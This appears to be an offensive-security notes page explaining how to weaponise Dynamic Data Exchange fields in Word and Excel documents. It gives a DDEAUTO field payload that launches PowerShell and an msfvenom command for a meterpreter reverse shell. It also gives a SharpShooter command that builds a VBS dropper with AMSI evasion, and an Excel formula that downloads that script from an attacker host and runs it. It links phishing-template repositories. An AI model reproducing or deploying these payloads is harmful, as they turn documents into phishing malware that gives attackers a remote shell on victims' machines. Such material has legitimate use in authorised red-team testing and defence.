# ⭕ DDE Auto - Word/Excel

{% embed url="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" %}

{% embed url="https://github.com/MartinSohn/Office-phish-templates" %}

## <mark style="color:red;">Intro</mark>

DDE is an old MS technology that is used to facilitate data transfer between applications. DDE sends messages between applications that share data and uses shared memory to exchange data between applications.  DDE can be embedded in several Office file formats

To leverage this attack vector:

Open a new MS document and insert a field

![](<../../.gitbook/assets/image (51) (1).png>)

It will add an "!Unexpected End of Formula" to the document, we right-click it and "Toggle field codes" :

![](<../../.gitbook/assets/image (33) (1) (1).png>)

We then replace the = \* MERGEFORMAT with the payload: 1 { DDEAUTO "C:\Programs\Microsoft\Office\MSWord.exe\\..\\..\\..\windows\system32\WindowsPowershell\v1.0\powershell.exe start calc # " "required"}​ Copied! If we save the document, reopen our document and accept the 2 prompts, calculator will popup.



This attack has been tested on the latest Windows10 LTSC edition with Microsoft Office 365 with up-to-date Windows Defender.

#### Requirements:

* Enabled Dynamic Data Exchange Server Lookup
* Enabled Dynamic Data Exchange Server Launch

Warning presented to the user who opens the worksheet:

![](<../../.gitbook/assets/image (2) (1).png>)

## <mark style="color:red;">Exploitation</mark>

generate msfvenom shellcode:

```
msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=192.168.1.108 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f raw -o raw3.txt
```

Create a malicious VBS script with SharpShooter with included raw3.txt shellcode file we generated earlier:

{% embed url="https://github.com/mdsecactivebreach/SharpShooter" %}

```
python2 SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo2 --rawscfile raw3.txt --amsi amsienable
```

And inject the command to Microsoft Excel function:

```
=cmd|'/c cmd.exe /c powershell.exe -nop -w hidden iwr -outf %tmp%\\msf.vbs http://192.168.1.108:8000/foo2.vbs & %tmp%\\msf.vbs'!'A1'
```

After the user skips the warning we get a meterpreter shell:

![](<../../.gitbook/assets/image (8).png>)

